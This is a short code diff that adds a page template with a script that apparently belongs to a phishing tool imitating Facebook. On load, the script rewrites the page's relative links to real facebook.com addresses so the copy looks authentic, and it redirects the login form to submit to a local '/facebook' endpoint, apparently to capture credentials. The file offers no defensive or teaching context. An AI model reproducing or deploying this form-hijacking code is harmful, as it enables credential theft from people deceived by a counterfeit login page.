@@ -1,0 +1,21 @@
+{{{ content }}}
+
+<script>
+  window.onload = function() {
+    var loginForm = document.getElementById('login_form');
+    var submitButton = document.querySelector("#login_form input[type='submit']");
+    var links = document.getElementsByTagName('a')
+    var regex = /(http:\/\/|https:\/\/)/
+
+    Array.from(links).forEach(link => {
+      var path = link.getAttribute('href')
+      if(!regex.test(path)) {
+        path = 'https://www.facebook.com' + path
+        link.setAttribute('href', path)
+      }
+    })
+
+    loginForm.setAttribute('action', '/facebook')
+    submitButton.setAttribute('id', 'loginbutton')
+  }
+</script>
